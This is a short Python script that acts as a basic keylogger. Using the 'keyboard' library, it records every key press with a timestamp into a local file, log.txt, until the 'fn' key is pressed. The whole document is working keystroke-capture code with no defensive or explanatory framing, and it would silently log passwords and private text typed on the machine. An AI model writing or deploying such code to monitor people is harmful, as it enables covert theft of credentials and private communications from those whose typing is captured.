from os import eventfd
import keyboard
from datetime import datetime
while 1 == 1:
    ev = keyboard.read_event()
    if ev.event_type == keyboard.KEY_DOWN:
        if ev.name == 'fn':
            break
        else:
            with open('log.txt','a',encoding='utf-8') as ass:
                ass.write(f'{datetime.now()}{ev.name}\n')
                